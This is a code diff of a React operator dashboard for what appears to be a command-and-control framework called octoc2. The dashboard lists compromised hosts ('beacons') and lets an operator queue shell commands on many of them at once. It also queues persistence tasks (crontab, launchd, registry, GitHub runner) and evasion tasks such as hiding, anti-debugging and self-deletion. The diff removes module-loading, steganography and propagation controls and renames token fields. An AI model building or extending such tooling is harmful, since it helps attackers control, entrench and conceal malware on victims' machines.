@@ -19,13 +19,19 @@ import type { SSEBeaconUpdate } from '@/lib/C2ServerClient';
 import { parseBeacon } from '@/lib/parseBeacon';
 import { getGitHubCoords } from '@/lib/coords';
 import { TENTACLE_NAMES } from '@/types/beacon';
+import { CHANNEL_BY_ID } from '@octoc2/shared/channels';
+import {
+  assertTaskArgs,
+  type EvasionAction,
+  type PersistenceMethod,
+} from '@octoc2/shared/tasks';
 import {
   applyBeaconFilters,
   DEFAULT_FILTER_STATE,
   SORT_LABELS,
   TENTACLE_FILTER_OPTIONS,
 } from '@/lib/beaconFilters';
-import type { BeaconFilterState, StatusFilter, OSFilter, TentacleFilter, SortKey } from '@/lib/beaconFilters';
+import type { BeaconFilterState, StatusFilter, OSFilter, SortKey } from '@/lib/beaconFilters';
 import type { ConnectionMode } from '@/types';
 import type { Beacon } from '@/types';
 import { Button } from '@/components/ui/button';
@@ -106,7 +112,10 @@ function FilterBar({ filters, onChange, total, visible, inputRef }: FilterBarPro
         value={filters.tentacle === 'all' ? 'all' : String(filters.tentacle)}
         onChange={e => {
           const v = e.target.value;
-          set('tentacle', v === 'all' ? 'all' : (parseInt(v, 10) as TentacleFilter));
+          set(
+            'tentacle',
+            v === 'all' ? 'all' : (CHANNEL_BY_ID[v]?.id ?? 'all'),
+          );
         }}
         className={SELECT_CLS}
       >
@@ -158,7 +167,7 @@ interface BulkActionBarProps {
   count:       number;
   mode:        ConnectionMode;
   serverUrl:   string;
-  pat:         string;
+  operatorToken: string;
   selectedIds: Set<string>;
   onClear:     () => void;
 }
@@ -177,40 +186,33 @@ function actionBtnCls(enabled: boolean) {
   );
 }
 
-type PersistMethod = 'auto' | 'crontab' | 'launchd' | 'registry' | 'gh-runner';
-type EvasionAction = 'hide' | 'anti_debug' | 'sleep' | 'self_delete' | 'status' | 'propagate';
-type StegoAction = 'ack' | 'encode' | 'decode';
+type SimpleEvasionAction = Exclude<EvasionAction, 'persist' | 'propagate'>;
 
-function BulkActionBar({ count, mode, serverUrl, pat, selectedIds, onClear }: BulkActionBarProps) {
+function BulkActionBar({
+  count,
+  mode,
+  serverUrl,
+  operatorToken,
+  selectedIds,
+  onClear,
+}: BulkActionBarProps) {
   const [command,      setCommand]      = useState('');
-  const [moduleName,   setModuleName]   = useState('');
-  const [persistMethod, setPersistMethod] = useState<PersistMethod>('auto');
-  const [evasionAction, setEvasionAction] = useState<EvasionAction>('hide');
-  const [stegoAction,   setStegoAction]   = useState<StegoAction>('encode');
+  const [persistMethod, setPersistMethod] = useState<PersistenceMethod>('auto');
+  const [evasionAction, setEvasionAction] = useState<SimpleEvasionAction>('hide');
 
   if (count === 0) return null;
 
   const isLive      = mode === 'live';
   const canShell    = isLive && command.trim().length > 0;
-  const canLoadMod  = isLive && moduleName.trim().length > 0;
 
   async function handleQueue() {
     if (!canShell) return;
-    const client = new C2ServerClient(serverUrl, pat);
+    const client = new C2ServerClient(serverUrl, operatorToken);
+    const args = assertTaskArgs('shell', { cmd: command.trim() });
     await Promise.all(
-      Array.from(selectedIds).map(id => client.queueTask(id, 'shell', { cmd: command }))
+      Array.from(selectedIds).map(id => client.queueTask(id, 'shell', args))
     );
     setCommand('');
-    onClear();
-  }
-
-  async function handleLoadModule() {
-    if (!canLoadMod) return;
-    const client = new C2ServerClient(serverUrl, pat);
-    await Promise.all(
-      Array.from(selectedIds).map(id => client.queueTask(id, 'load-module', { name: moduleName }))
-    );
-    setModuleName('');
     onClear();
   }
 
@@ -220,40 +222,30 @@ function BulkActionBar({ count, mode, serverUrl, pat, selectedIds, onClear }: Bu
       `Queue "persist (${persistMethod})" on ${selectedIds.size} beacon(s)? This action cannot be undone.`
     );
     if (!confirmed) return;
-    const client = new C2ServerClient(serverUrl, pat);
+    const client = new C2ServerClient(serverUrl, operatorToken);
+    const args = assertTaskArgs('evasion', {
+      action: 'persist',
+      method: persistMethod,
+    });
     await Promise.all(
       Array.from(selectedIds).map(id =>
-        client.queueTask(id, 'evasion', { action: 'persist', method: persistMethod })
+        client.queueTask(id, 'evasion', args)
       )
     );
     onClear();
   }
 
-  async function handleOpenHulud() {
+  async function handleEvasion() {
     if (!isLive) return;
     const confirmed = window.confirm(
-      `Queue "openhulud (${evasionAction})" on ${selectedIds.size} beacon(s)? This action cannot be undone.`
+      `Queue "evasion (${evasionAction})" on ${selectedIds.size} beacon(s)? This action cannot be undone.`
     );
     if (!confirmed) return;
-    const client = new C2ServerClient(serverUrl, pat);
+    const client = new C2ServerClient(serverUrl, operatorToken);
+    const args = assertTaskArgs('evasion', { action: evasionAction });
     await Promise.all(
       Array.from(selectedIds).map(id =>
-        client.queueTask(id, 'openhulud', { action: evasionAction })
-      )
-    );
-    onClear();
-  }
-
-  async function handleStego() {
-    if (!isLive) return;
-    const confirmed = window.confirm(
-      `Queue "stego (${stegoAction})" on ${selectedIds.size} beacon(s)? This action cannot be undone.`
-    );
-    if (!confirmed) return;
-    const client = new C2ServerClient(serverUrl, pat);
-    await Promise.all(
-      Array.from(selectedIds).map(id =>
-        client.queueTask(id, 'stego', { action: stegoAction })
+        client.queueTask(id, 'evasion', args)
       )
     );
     onClear();
@@ -291,36 +283,11 @@ function BulkActionBar({ count, mode, serverUrl, pat, selectedIds, onClear }: Bu
 
       <span className={DIVIDER_CLS}>|</span>
 
-      {/* ── Load-module group ─────────────────────────────────────────────── */}
-      <input
-        aria-label="Module name"
-        type="text"
-        placeholder="module name…"
-        value={moduleName}
-        onChange={e => setModuleName(e.target.value)}
-        className={
-          'bg-octo-surface border border-octo-border text-gray-300 font-mono text-[10px] ' +
-          'rounded px-1.5 py-0.5 focus:outline-none focus:border-octo-blue/60 ' +
-          'placeholder:text-gray-700 w-32 transition-colors shrink-0'
-        }
-      />
-      <button
-        aria-label="Queue load-module task"
-        disabled={!canLoadMod}
-        title={!isLive ? 'Live mode required' : !moduleName.trim() ? 'Enter a module name' : undefined}
-        onClick={handleLoadModule}
-        className={actionBtnCls(canLoadMod)}
-      >
-        Load module
-      </button>
-
-      <span className={DIVIDER_CLS}>|</span>
-
       {/* ── Persist group ─────────────────────────────────────────────────── */}
       <select
         aria-label="Persistence method"
         value={persistMethod}
-        onChange={e => setPersistMethod(e.target.value as PersistMethod)}
+        onChange={e => setPersistMethod(e.target.value as PersistenceMethod)}
         className={SELECT_CLS + ' shrink-0'}
       >
         <option value="auto">auto</option>
@@ -328,6 +295,7 @@ function BulkActionBar({ count, mode, serverUrl, pat, selectedIds, onClear }: Bu
         <option value="launchd">launchd</option>
         <option value="registry">registry</option>
         <option value="gh-runner">gh-runner</option>
+        <option value="gh-runner-register">gh-runner-register</option>
       </select>
       <button
         aria-label="Queue persist task"
@@ -341,11 +309,11 @@ function BulkActionBar({ count, mode, serverUrl, pat, selectedIds, onClear }: Bu
 
       <span className={DIVIDER_CLS}>|</span>
 
-      {/* ── OpenHulud group ───────────────────────────────────────────────── */}
+      {/* ── Evasion group ─────────────────────────────────────────────────── */}
       <select
         aria-label="Evasion action"
         value={evasionAction}
-        onChange={e => setEvasionAction(e.target.value as EvasionAction)}
+        onChange={e => setEvasionAction(e.target.value as SimpleEvasionAction)}
         className={SELECT_CLS + ' shrink-0'}
       >
         <option value="hide">hide</option>
@@ -353,43 +321,20 @@ function BulkActionBar({ count, mode, serverUrl, pat, selectedIds, onClear }: Bu
         <option value="sleep">sleep</option>
         <option value="self_delete">self_delete</option>
         <option value="status">status</option>
-        <option value="propagate">propagate</option>
       </select>
       <button
-        aria-label="Queue openhulud task"
+        aria-label="Queue evasion task"
         disabled={!isLive}
         title={!isLive ? 'Live mode required' : undefined}
-        onClick={handleOpenHulud}
+        onClick={handleEvasion}
         className={actionBtnCls(isLive)}
       >
-        OpenHulud
+        Evasion
       </button>
 
       <span className={DIVIDER_CLS}>|</span>
 
-      {/* ── Stego group ──────────────────────────────────────────────────── */}
-      <select
-        aria-label="Stego action"
-        value={stegoAction}
-        onChange={e => setStegoAction(e.target.value as StegoAction)}
-        className={SELECT_CLS + ' shrink-0'}
-      >
-        <option value="ack">ack</option>
-        <option value="encode">encode</option>
-        <option value="decode">decode</option>
-      </select>
-      <button
-        aria-label="Queue stego task"
-        disabled={!isLive}
-        title={!isLive ? 'Live mode required' : undefined}
-        onClick={handleStego}
-        className={actionBtnCls(isLive)}
-      >
-        Stego
-      </button>
-
-      <span className={DIVIDER_CLS}>|</span>
-
+      {/* ── Results link ──────────────────────────────────────────────────── */}
       <a
         href={`/results?beacons=${Array.from(selectedIds).join(',')}`}
         className="font-mono text-[10px] rounded px-2 py-0.5 border border-octo-border text-gray-500 hover:text-gray-300 transition-colors shrink-0"
@@ -411,7 +356,7 @@ function BulkActionBar({ count, mode, serverUrl, pat, selectedIds, onClear }: Bu
 // ── Component ─────────────────────────────────────────────────────────────────
 
 export function BeaconTable() {
-  const { pat, mode, serverUrl, latencyMs } = useAuth();
+  const { githubPat, operatorToken, mode, serverUrl, latencyMs } = useAuth();
   const navigate = useNavigate();
   const queryClient = useQueryClient();
   const { owner, repo } = getGitHubCoords();
@@ -443,21 +388,21 @@ export function BeaconTable() {
   // Pushes server-pushed beacon updates straight into the react-query cache
   // so the table refreshes instantly without waiting for the 30s poll cycle.
   useEffect(() => {
-    if (mode !== 'live' || !pat || !serverUrl) return;
+    if (mode !== 'live' || !operatorToken || !serverUrl) return;
 
     const ctrl   = new AbortController();
-    const client = new C2ServerClient(serverUrl, pat);
+    const client = new C2ServerClient(serverUrl, operatorToken);
     setSseActive(false);
 
     client.subscribeEvents((event) => {
       if (event.type === 'beacon-update') {
-        queryClient.setQueryData(['beacons-live', serverUrl, pat], event.beacons);
+        queryClient.setQueryData(['beacons-live', serverUrl, operatorToken], event.beacons);
         setSseActive(true);
       }
     }, ctrl.signal).catch(() => { /* stream closed or aborted */ });
 
     return () => ctrl.abort();
-  }, [mode, serverUrl, pat, queryClient]);
+  }, [mode, serverUrl, operatorToken, queryClient]);
 
   // ── API-mode query (GitHub Issues) ─────────────────────────────────────────
 
@@ -466,9 +411,9 @@ export function BeaconTable() {
     isLoading: ghLoading,
     error: ghError,
   } = useQuery({
-    queryKey:        ['beacons', pat, owner, repo],
-    queryFn:         () => new GitHubApiClient(pat, owner, repo).getBeacons(),
-    enabled:         mode === 'api' && pat.length > 0,
+    queryKey:        ['beacons', githubPat, owner, repo],
+    queryFn:         () => new GitHubApiClient(githubPat, owner, repo).getBeacons(),
+    enabled:         mode === 'api' && githubPat.length > 0,
     refetchInterval: 30_000,
     staleTime:       10_000,
   });
@@ -480,9 +425,9 @@ export function BeaconTable() {
     isLoading: liveLoading,
     error: liveError,
   } = useQuery({
-    queryKey:        ['beacons-live', serverUrl, pat],
-    queryFn:         () => new C2ServerClient(serverUrl, pat).getBeacons(),
-    enabled:         mode === 'live' && pat.length > 0,
+    queryKey:        ['beacons-live', serverUrl, operatorToken],
+    queryFn:         () => new C2ServerClient(serverUrl, operatorToken).getBeacons(),
+    enabled:         mode === 'live' && operatorToken.length > 0,
     refetchInterval: 30_000,
     staleTime:       10_000,
   });
@@ -581,7 +526,7 @@ export function BeaconTable() {
         count={selectedIds.size}
         mode={mode}
         serverUrl={serverUrl}
-        pat={pat}
+        operatorToken={operatorToken}
         selectedIds={selectedIds}
         onClear={() => setSelectedIds(new Set())}
       />
